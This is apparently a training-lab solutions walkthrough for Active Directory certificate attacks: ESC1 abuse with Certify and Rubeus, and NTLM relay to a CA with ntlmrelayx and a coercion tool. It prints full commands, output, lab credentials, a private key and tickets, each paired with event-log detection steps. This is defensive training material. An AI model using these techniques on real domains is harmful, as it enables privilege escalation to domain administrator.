Checking domain DC=eagle,DC=local

Registering ServicePrincipalNames for CN=SERVER01,OU=Servers,DC=eagle,DC=local
        ldap/server02
Updated object
```

Students now need to check for the triggered events. From the current RDP session, students need to click the Start button and type Remote Desktop Connection:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `htb-student:HTB_@cademy_stdnt!` and open Event Viewer:

![[HTB Solutions/CDSA/z. images/0bc1f9e755fd5250ffe78a7f08084f88_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/467b021ae150084148657846cd24a31b_MD5.jpg]]

To find the event, students need to go to Windows Logs -> Security, and right-click to Filter Current Log:

![[HTB Solutions/CDSA/z. images/c92a5f8363af86fd318027311319a95f_MD5.jpg]]

Replacing `<All Event IDs>` with `4738`:

![[HTB Solutions/CDSA/z. images/e9b634249177e76f44480d06d6bdb3e6_MD5.jpg]]

Students will find the event displays "A user account was changed".

Additionally, students need to filter for ID `4742` to find the event associated with the change of the Server01 machine:

![[HTB Solutions/CDSA/z. images/7e39ee2e60e203523c9151ea23d1f729_MD5.jpg]]

Students will find the event displays "A computer account was changed."

Once the tasks have been completed, are free to enter `DONE`.

Answer: `DONE`

# PKI - ESC1

## Question 1

### "Connect to the Kali host first, then RDP to WS001 as 'bob:Slavi123' and practice the techniques shown in this section. What is the flag value located at \\\\dc1\\c$\\scripts?"

Initially, students need to RDP (`kali:kali`) to the Kali host:

```
┌─[eu-academy-2]─[10.10.15.245]─[htb-ac-594497@htb-lvxcyc2lxd]─[~]
└──╼ [★]$ xfreerdp /v:10.129.86.37 /u:kali /p:kali /dynamic-resolution 

[14:12:10:809] [3265:3266] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[14:12:10:809] [3265:3266] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
```

Then students need to RDP to the WS001 machine as `bob:Slavi123` , specifying their current user's home directory as a shared drive:

Code: shell

```shell
xfreerdp /v:172.16.18.25 /u:bob /p:Slavi123 /dynamic-resolution /drive:share,/home/kali
```

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:bob /p:Slavi123 /v:172.16.18.25 /dynamic-resolution /drive:share,/home/kali

[09:13:11:768] [1617:1618] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[09:13:11:769] [1617:1618] [WARN][com.freerdp.crypto] - CN = WS001.eagle.local
[09:13:12:178] [1617:1618] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[09:13:12:178] [1617:1618] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[09:13:12:193] [1617:1618] [INFO][com.freer
<SNIP>
```

On the WS001 host now, students need to open PowerShell as Administrator and navigate to the Downloads folder:

Code: powershell

```powershell
cd C:\Users\bob\Downloads\
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> cd C:\Users\bob\Downloads\
```

Now, students need to use Certify.exe to request a certificate from the CA server:

Code: powershell

```powershell
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```

```
PS C:\Users\bob\Downloads> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

 <SNIP>

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 52

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1l/63w8lDk+Y/LHGHXhTJrGWd3rnNN0pKKGg/xuVZMVW4rhz
JLTw3Hb6/q+fAjhM28jjJw8d0FB5+e5PAf0p0hICz2REcyFiNa9ZkwQbxLj/tnsZ
W5OfwMoDT0mI+J/EXAePjONymORbO+tw9F6pbZq8IfaCenKf1UnHYtQeGdqlhCGh
5oFvlzXQdWQyLg39hhbBmFxbj1zTfvaWNHqG011uRZHiHzprAwebMl82qNvsu6bF
nA65pnvbQsA4eM8lX6/Z0EXHiRrWfBzVA2peNeTnWS0sETN+nHkxVXKZ8qTDrMfI
jicQDb0hy6pzb4bts2KsrHULBacLQ28ZKMoOjQIDAQABAoIBAB2nxWKaC7xBEp7S
UN++x3Hw2ynIHLfZaFowkb74p9/61Jwke/k19qPo6avVy59Y/njg/1tl4e/xUg5b
Ax75UJG44B6kdjufAKEAktmdleHO3cD2onlioJTg3ThYqdQK9fTtLtSEmlPAM0bE
uSl09ucsop3oJgCeXrH4tNZdFZTpw0SiIPf8AqCcKpZLkRgg0AegO+BbBVLLdvrP
uyvLflbu9MQ0we+9R4n4K6uyJx8NUPz45BhSrOtelc02/RspueTRQAChmujpn8Bo
rn3ShFw/HqGwV82dnl6yo4FZD5p1V/NqvGD6jW00gBiw0gjQ0S7U2tfRO5Bb9bez
+gs3uVkCgYEA+62tO0cdoDgtqWlustGGE60fKdCa4/gl5QOcpgDDQN3tc7CuglrR
ClD2NUuU3ZXL+BGhsuTpLPDN63JlVkePa1uQCNETA6R2SUYWUztcMpYk/37frey1
5wr1v5c8vlNUAFevlTzDonqbuJY0GUaAp5uTQLhQ509JHbktdptICPsCgYEA2g5T
Qu1pC3/SPefsepHYf5stJR6zlVuq/lfr7Q2FLSd+ceFBZoe5MmhR9XbOVabmnXWA
cLYqM7RIFGpIaEJWV9kAcyOitgrN/D1MZbMErXAZgZxSiIj5uVTUwx+dAqjyKAFh
K+2Dxs/JVIFlG17gmu2Q6dEf697Q9vsZ/zGvwBcCgYEAjqF1vFNoScWsswbqUnMF
rh79uz/al/mo2Cn82+MwxJFBIcBulbeMInGRptCHtDBRoOu1HOI3910dBiMVpRj3
AZupfCWoxfathocu3cqVTKHko9suPq4YxLBkZ0j5hs9Ims0W19fQ80LS/4A4VF6t
SM+VWydZyk0Xnb21MzN7VoMCgYB4lBNWnxHHWhdYRDdwT9X4Okbsj92eaeJUYyoD
G8bZAU3ai0Uu/T5bsXQg2GGg23oK+D7eFN2hWb/CCkOf4477ZPPqt3nyUGc3ZG4q
jqO3hJWWJms9NQFiipZcj86y+dluZdTmBaEo/x3FrQfL6tso0NWhdhLAy6Wh7Zii
lUcqYQKBgQC8HyMNG8QNvB2ra6ASnH6jDht9eAjYHfL15kSV7VuXKiPOnO7QjIki
Me9/erTqR/sy9ubWZ1LA9Y5kFOnPZw+O5kVjQl+RTOmwCZld14ZVw6aAdPMsDBGS
8BRgkB6MtUFyfqkbgtKz9r4Mot5LqeLa8aXc4zk4/aGmxiiFwJvoGQ==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGLzCCBRegAwIBAgITFgAAADTtX54AFs7ipAAAAAAANDANBgkqhkiG9w0BAQsF
ADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVlYWds
ZTEVMBMGA1UEAxMMZWFnbGUtUEtJLUNBMB4XDTIzMDQxOTEyNDg0NFoXDTI1MDQx
OTEyNTg0NFowUTEVMBMGCgmSJomT8ixkARkWBWxvY2FsMRUwEwYKCZImiZPyLGQB
GRYFZWFnbGUxEzARBgNVBAsTCkVhZ2xlVXNlcnMxDDAKBgNVBAMTA2JvYjCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANZf+t8PJQ5PmPyxxh14Uyaxlnd6
5zTdKSihoP8blWTFVuK4cyS08Nx2+v6vnwI4TNvI4ycPHdBQefnuTwH9KdISAs9k
RHMhYjWvWZMEG8S4/7Z7GVuTn8DKA09JiPifxFwHj4zjcpjkWzvrcPReqW2avCH2
gnpyn9VJx2LUHhnapYQhoeaBb5c10HVkMi4N/YYWwZhcW49c0372ljR6htNdbkWR
4h86awMHmzJfNqjb7LumxZwOuaZ720LAOHjPJV+v2dBFx4ka1nwc1QNqXjXk51kt
LBEzfpx5MVVymfKkw6zHyI4nEA29Icuqc2+G7bNirKx1CwWnC0NvGSjKDo0CAwEA
AaOCAwowggMGMD4GCSsGAQQBgjcVBwQxMC8GJysGAQQBgjcVCIXA2V2Evq86gv2J
DIa5zBKD/tVZgV2H9L4xhO/rCAIBZAIBBTA1BgNVHSUELjAsBgorBgEEAYI3FAIC
BggrBgEFBQcDBAYKKwYBBAGCNwoDBAYIKwYBBQUHAwIwDgYDVR0PAQH/BAQDAgWg
MEMGCSsGAQQBgjcVCgQ2MDQwDAYKKwYBBAGCNxQCAjAKBggrBgEFBQcDBDAMBgor
BgEEAYI3CgMEMAoGCCsGAQUFBwMCMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZIhvcN
AwICAgCAMA4GCCqGSIb3DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
HQ4EFgQUZocaOA2c9ZS6iSVAa4NHQkN4TfowKAYDVR0RBCEwH6AdBgorBgEEAYI3
FAIDoA8MDUFkbWluaXN0cmF0b3IwHwYDVR0jBBgwFoAUfAmV68CG4/FlbH3xp2ae
5awKC2UwgcYGA1UdHwSBvjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZWFnbGUt
UEtJLUNBLENOPVBLSSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMs
Q049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1lYWdsZSxEQz1sb2NhbD9j
ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
dHJpYnV0aW9uUG9pbnQwgb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaB
nmxkYXA6Ly8vQ049ZWFnbGUtUEtJLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWVhZ2xl
LERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZp
Y2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUAA4IBAQBZH2YfdtT0c2cHC1LH
oPFbeYYoObN04U+Ix5OoW3p289qEfRDHc+FdV0ZuhL1kzpXbFXE4dwNSfiHj85y/
DoN5tWxtO53mX3GtxS0rkgHHFOyJlQqi+kzNM89EQNbHXNZVbK74x5Xc0XtlMWOB
PNb+vw5yfnYZeVghHcAiLX0Ek6rTj1b4jWVvGelDnbtc43gpMg7at6X78wlguphl
PSXxeLLpRfv+/+C99KWtduRK/J/RzoYCe8w2o6wewISzVWE+KiZje3VKaKJekE2p
RhN7NOngEsR8Q0iD6rLcG7iWhdQsD7tTCculGFigohWXGSSsulFMHimed3P5nD0z
86rm
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:21.1820590
```

Students need to open a new text document on the Desktop and copy/paste the cert.pem contents into it:

![[HTB Solutions/CDSA/z. images/9ee36ffea6357a0983c91289fe6d198d_MD5.jpg]]

Using the shared drive, students need to transfer cert.pem back to Kali:

![[HTB Solutions/CDSA/z. images/52c5300345c640b1fa6a2855f5d628de_MD5.jpg]]

Once transferred, students need to return to Kali and convert the certificate to a .pfx file, leaving an empty password when prompted:

Code: shell

```shell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```
┌──(kali㉿kali)-[~]
└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Enter Export Password:
Verifying - Enter Export Password:
```

Consequently, students need to transfer the cert.pfx file back to the WS001 Desktop using the shared drive:

![[HTB Solutions/CDSA/z. images/d7ba67cade3965345f4e5a909cae8977_MD5.jpg]]

From the current PowerShell session, students need to copy the cert.pfx to the downloads directory:

Code: powershell

```powershell
copy C:\Users\bob\Desktop\cert.pfx .\cert.pfx
```

```
PS C:\Users\bob\Downloads> copy C:\Users\bob\Desktop\cert.pfx .\cert.pfx
```

Then, they need to use Rubeus.exe along with the cert.pfx to request a TGT for the domain administrator:

Code: powershell

```powershell
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

```
PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=bob, OU=EagleUsers, DC=eagle, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'eagle.local\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGVjCCBlKgAwIBBaEDAgEWooIFaTCCBWVhggVhMIIFXaADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqAD
<SNIP>
      GA8yMDIzMDQyNjE5MjQxMlqoDRsLRUFHTEUuTE9DQUypIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC2VhZ2xl
      LmxvY2Fs
      
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/eagle.local
  ServiceRealm             :  EAGLE.LOCAL
  UserName                 :  Administrator
  UserRealm                :  EAGLE.LOCAL
  StartTime                :  19/04/2023 21.24.12
  EndTime                  :  20/04/2023 07.24.12
  RenewTill                :  26/04/2023 21.24.12
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  J75PUtyDzTNPPQKrCz5GKw==
  ASREP (key)              :  82EDD43617BE9FA661646025ED0B6326
```

With the ticket for the domain admin loaded into the session, students are now able to read the contents of the flag.txt file located on DC1:

Code: powershell

```powershell
cat \\dc1\c$\scripts\flag.txt
```

```
PS C:\Users\bob\Downloads> cat \\dc1\c$\scripts\flag.txt

Pk1_Vuln3r@b!litY
```

Students should also look at the logs , and need to connect as `htb-student:HTB_@cademy_stdnt!` to DC1 with RDP:

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:172.16.18.3 /dynamic-resolution

[18:12:05:039] [3396:3397] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[18:12:05:039] [3396:3397] [WARN][com.freerdp.crypto] - CN = DC1.eagle.local
[18:12:05:039] [3396:3397] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[18:12:05:039] [3396:3397] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[18:12:05:039] [3396:3397] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
<SNIP>
```

Opening the Event Viewer, students need to filter for event ID `4768`:

![[HTB Solutions/CDSA/z. images/2eebb9c7db371f28669a13353a906ff9_MD5.jpg]]

Students will find the event shows the eagle-PKI-CA was responsible for issuing the certificate, and the logon attempt can be traced back to it.

After reviewing the event, students need to submit the previously discovered flag, `Pk1_Vuln3r@b!litY`.

Answer: `Pk1_Vuln3r@b!litY`

# PKI - ESC1

## Question 2

### "After performing the ESC1 attack, connect to PKI (172.16.18.15) as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs. On what date was the very first certificate requested and issued?"

From the previously established RDP session, students need to open the command prompt, utilizing the `runas` command to launch a PowerShell as `htb-student:HTB_@cademy_stdnt!`:

Code: cmd

```cmd
runas /user:eagle\htb-student PowerShell
```

```
Microsoft Windows [Version 10.0.19044.2728]
(c) Microsoft Corporation. All rights reserved.

C:\Users\bob>runas /user:eagle\htb-student PowerShell

Enter the password for eagle\htb-student:
Attempting to start PowerShell as user "eagle\htb-student" ...
```

At last, students need to enter a new PowerShell remote session on the PKI machine, using the Get-WinEvent cmdlet to view the events:

Code: cmd

```cmd
New-PSSession PKI
Enter-PSSession PKI
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> New-PSSession PKI

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          PKI             RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\WINDOWS\system32> Enter-PSSession PKI
[PKI]: PS C:\Users\htb-student\Documents> Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
4/19/2023 9:17:44 PM          4886 Information      Certificate Services received a certificate request....
4/7/2023 8:51:54 PM           4886 Information      Certificate Services received a certificate request....
12/19/2022 11:35:45 PM        4886 Information      Certificate Services received a certificate request....
12/19/2022 10:12:01 PM        4886 Information      Certificate Services received a certificate request....
12/19/2022 10:11:14 PM        4886 Information      Certificate Services received a certificate request....
```

Here, students will find the `12-19-2022` date of the first certificate request.

Answer: `12-19-2022`

# Skills Assessment

## Question 1

### "Replicate the attack described in this section and view the related 4886 and 4887 logs. Enter the name shown in the Requester field as your answer. (Format: EAGLE....)"

Students need to connect (`kali:kali`) to the Kali host with RDP:

Code: shell

```shell
xfreerdp /v:STMIP /u:kali /p:kali /dynamic-resolution
```

```
┌─[us-academy-2]─[10.10.14.220]─[htb-ac-594497@htb-z7uyk0jo71]─[~]
└──╼ [★]$ xfreerdp /v:10.129.100.146 /u:kali /p:kali /dynamic-resolution 

[23:40:51:726] [4536:4537] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[23:40:51:726] [4536:4537] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
<SNIP>
```

Once connected, students need to open a new terminal within Kali:

![[HTB Solutions/CDSA/z. images/09d991b84d1308758b63f7ef3a6200df_MD5.jpg]]

With the terminal open, students need to switch to the root user, then start `impacket-ntlmrelayx`, specifying the CA server as the target:

Code: shell

```shell
sudo su
impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs
```

```
┌──(kali㉿kali)-[~]
└─$ sudo su

[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali]
└─# impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Consequently, students need to open a new tab in the terminal, switch to root, and run `dementor.py`:

Code: shell

```shell
sudo su
cd tools
python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
```

```
┌──(kali㉿kali)-[~]
└─$ sudo su

[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali]
└─# cd tools 
┌──(root㉿kali)-[/home/kali/tools]
└─# python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123

[*] connecting to 172.16.18.4
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
```

Coercing a connection from DC2, students need to check the other terminal, finding a base64 encoded certificate for the `DC2$` machine account:

```
[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 172.16.18.4, attacking target http://172.16.18.15
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://172.16.18.15 as EAGLE/DC2$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Connection from 172.16.18.4 controlled, but there are no more targets left!
[*] SMBD-Thread-8 (process_request_thread): Connection from 172.16.18.4 controlled, but there are no more targets left!
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 50
[*] Base64 certificate of user DC2$: 
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